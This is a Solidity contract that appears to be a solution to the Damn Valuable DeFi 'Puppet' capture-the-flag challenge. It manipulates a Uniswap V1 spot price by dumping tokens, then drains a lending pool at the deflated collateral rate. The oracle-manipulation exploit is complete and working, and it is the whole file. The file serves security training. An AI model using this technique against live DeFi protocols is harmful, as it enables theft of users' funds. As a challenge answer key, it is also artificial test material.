// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {DamnValuableToken} from "../DamnValuableToken.sol";
import {IUniswapV1Exchange} from "./IUniswapV1Exchange.sol";
import {PuppetPool} from "./PuppetPool.sol";

contract PuppetExploiter {
    DamnValuableToken private immutable token;
    IUniswapV1Exchange private immutable uniswapExchange;
    PuppetPool private immutable lendingPool;
    address private immutable owner;

    constructor(address _token, address _uniswapExchange, address _lendingPool) {
        token = DamnValuableToken(_token);
        uniswapExchange = IUniswapV1Exchange(_uniswapExchange);
        lendingPool = PuppetPool(_lendingPool);
        owner = msg.sender;
    }

    function exploit(uint256 amount, address recovery) external payable {
        require(msg.sender == owner, "Not owner");
        
        // Transfer tokens from owner to this contract
        require(token.transferFrom(owner, address(this), amount), "Transfer failed");
        
        // Approve tokens for Uniswap
        token.approve(address(uniswapExchange), amount);
        
        // Dump tokens to manipulate price
        uniswapExchange.tokenToEthSwapInput(
            amount,
            1, // min ETH
            block.timestamp + 300 // 5 minutes from now
        );
        
        // Calculate required deposit after price manipulation
        uint256 poolBalance = token.balanceOf(address(lendingPool));
        uint256 depositRequired = lendingPool.calculateDepositRequired(poolBalance);
        
        // Ensure we have enough ETH for deposit
        require(address(this).balance >= depositRequired, "Insufficient ETH for deposit");
        
        // Borrow all tokens from lending pool
        lendingPool.borrow{value: depositRequired}(poolBalance, recovery);
        
        // Return remaining ETH to owner
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {}
}
